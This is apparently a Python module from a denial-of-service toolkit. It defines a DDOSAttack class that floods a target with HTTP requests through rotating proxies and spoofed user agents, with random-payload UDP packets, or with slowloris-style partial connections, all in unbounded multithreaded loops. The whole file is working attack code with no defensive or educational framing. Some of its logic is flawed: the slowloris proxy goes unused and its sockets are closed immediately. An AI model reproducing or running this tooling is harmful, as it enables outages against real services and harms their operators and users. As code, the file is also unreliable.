import threading
import requests
import socket
import random
from .proxy_manager import ProxyManager
from .utils import validate_target
from config import Config

class DDOSAttack:
    def __init__(self, target, attack_type, num_threads, proxy_manager):
        self.target = target
        self.attack_type = attack_type
        self.num_threads = num_threads
        self.proxy_manager = proxy_manager
        self.config = Config()
        self.user_agents = self.config.user_agents

    def http_flood(self):
        while True:
            proxy = self.proxy_manager.get_proxy()
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = requests.get(self.target, headers=headers, proxies={'http': proxy, 'https': proxy}, timeout=5)
                print(f"HTTP Flood: {self.target} | Status Code: {response.status_code} | Proxy: {proxy}")
            except Exception as e:
                print(f"HTTP Flood Error: {e} | Proxy: {proxy}")

    def udp_flood(self):
        target_ip = socket.gethostbyname(self.target)
        port = random.randint(1, 65535)
        while True:
            try:
                data = random._urandom(1024)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.sendto(data, (target_ip, port))
                    print(f"UDP Flood: {target_ip}:{port}")
            except Exception as e:
                print(f"UDP Flood Error: {e}")

    def slowloris(self):
        while True:
            proxy = self.proxy_manager.get_proxy()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, 80))
                sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('utf-8'))
                sock.send("Host: {}\r\n".format(self.target).encode('utf-8'))
                sock.send("User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode('utf-8'))
                sock.send("Connection: keep-alive\r\n".encode('utf-8'))
                print(f"Slowloris: {self.target} | Proxy: {proxy}")
            except Exception as e:
                print(f"Slowloris Error: {e} | Proxy: {proxy}")
            finally:
                sock.close()

    def run(self):
        if self.attack_type == 'http':
            attack_func = self.http_flood
        elif self.attack_type == 'udp':
            attack_func = self.udp_flood
        elif self.attack_type == 'slowloris':
            attack_func = self.slowloris
        else:
            print("Invalid attack type.")
            return

        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=attack_func)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
